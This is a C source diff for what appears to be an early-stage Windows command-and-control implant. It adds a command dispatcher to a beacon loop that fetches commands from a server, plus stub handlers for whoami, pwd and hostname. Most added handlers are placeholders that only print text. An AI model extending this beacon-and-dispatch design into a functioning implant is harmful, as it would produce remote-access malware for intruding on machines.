@@ -5,6 +5,21 @@
 #include <settings.h>
 #include <imports.h>
 #include <paths.h>
+#include <patch.h>
+
+BOOL (*patch_list_pointers[3]) (CHAR **ouput);
+
+BOOL AA$whoami() {
+    printf("whoami");
+}
+
+BOOL AB$pwd() {
+    printf("pwd");
+}
+
+BOOL AC$hostname() {
+    printf("hostname");
+}
 
 BOOL Registration(CHAR **cookie) {
     HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
@@ -153,7 +168,9 @@ BOOL Beacon(CHAR  *cookie) {
                     memcpy_s(cmd+offset, buffer_length, temp_buffer, download_buffer);
                     memset(temp_buffer, 0, 8192+1);
                     offset += download_buffer;
-                    printf(cmd);
+                    if (cmd) {
+                        Process(cookie, cmd);
+                    }
                 }
                 free(cmd);
                 if (hRequest) {
@@ -170,6 +187,16 @@ BOOL Beacon(CHAR  *cookie) {
     }
     free(post_buffer);
     return TRUE;
+}
+
+BOOL Process(char* cookie, char *cmd) {
+    int length = strlen(cmd);
+    char *alloc = (CHAR*)calloc(length + 1, sizeof(CHAR));
+
+    char *output_1 = (CHAR*)calloc(10, sizeof(CHAR));
+
+    int cmd_int = atoi(cmd);
+    printf("Command: 0x%x\n", cmd_int);
 }
 
 void Sleep_Time() {
@@ -194,6 +221,10 @@ int main() {
     agent.port = 8080;
     agent.path = Directoryyyyy();
     agent.key = "boondoggle";
+
+    patch_list_pointers[0] = AA$whoami;
+    patch_list_pointers[1] = AB$pwd;
+    patch_list_pointers[2] = AC$hostname;
 
     Registration(&cookie);
     Sleep_Time();
